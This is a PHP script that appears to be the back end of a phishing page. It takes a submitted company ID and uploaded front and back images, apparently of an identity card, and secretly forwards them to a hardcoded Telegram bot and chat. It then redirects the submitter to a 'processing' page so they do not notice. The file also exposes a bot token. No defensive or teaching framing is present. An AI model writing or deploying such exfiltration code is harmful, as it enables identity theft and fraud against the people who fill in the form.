<?php
// Your Telegram bot token and chat ID
$botToken = "8023709482:AAE1lBDGOmPbjJ5B6_cpBTQfPiRJ2uG7_qM";
$chatId   = "8483934112";

// Get submitted data
$companyId = $_POST['companyId'] ?? '';

$frontFile = $_FILES['frontUpload'] ?? null;
$backFile  = $_FILES['backUpload'] ?? null;

// --- Send company ID as a message ---
if(!empty($companyId)){
    $message = "📌 New Submission\nCompany ID: $companyId";
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
}

// --- Function to send uploaded files ---
function sendDocument($botToken, $chatId, $file){
    if($file && $file['error'] === 0){
        $url = "https://api.telegram.org/bot$botToken/sendDocument";
        $post_fields = [
            'chat_id' => $chatId,
            'document' => new CURLFile($file['tmp_name'], $file['type'], $file['name'])
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    return false;
}

// --- Send front and back images ---
sendDocument($botToken, $chatId, $frontFile);
sendDocument($botToken, $chatId, $backFile);

// --- Move the "Test message" here if you want it to run ---
// The redirect means the user won't see the var_dump result, 
// but the message will be sent.
$result = file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode("Test message"));
// var_dump($result); // This will not be visible to the user because of the redirect

// --- Redirect user to processing page ---
header("Location: processing.html");
exit;
?>
